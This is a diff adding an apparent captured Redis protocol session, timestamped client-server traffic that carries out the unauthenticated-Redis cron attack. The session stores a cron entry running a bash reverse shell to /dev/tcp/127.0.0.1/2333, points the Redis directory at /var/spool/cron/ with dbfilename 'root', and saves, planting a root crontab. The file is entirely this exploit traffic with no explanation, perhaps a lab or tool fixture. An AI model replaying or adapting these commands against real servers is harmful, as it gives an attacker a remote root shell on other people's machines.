@@ -1,0 +1,53 @@
+> 2017/10/11 01:24:52.432446  length=85 from=0 to=84
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$58\r
+
+
+
+*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1
+
+
+
+\r
+< 2017/10/11 01:24:52.432685  length=5 from=0 to=4
++OK\r
+> 2017/10/11 01:24:52.435153  length=57 from=0 to=56
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$16\r
+/var/spool/cron/\r
+< 2017/10/11 01:24:52.435332  length=5 from=0 to=4
++OK\r
+> 2017/10/11 01:24:52.437594  length=52 from=0 to=51
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$4\r
+root\r
+< 2017/10/11 01:24:52.437760  length=5 from=0 to=4
++OK\r
+> 2017/10/11 01:24:52.439943  length=14 from=0 to=13
+*1\r
+$4\r
+save\r
+< 2017/10/11 01:24:52.443318  length=5 from=0 to=4
++OK\r
+> 2017/10/11 01:24:52.446034  length=14 from=0 to=13
+*1\r
+$4\r
+quit\r
+< 2017/10/11 01:24:52.446148  length=5 from=0 to=4
++OK\r
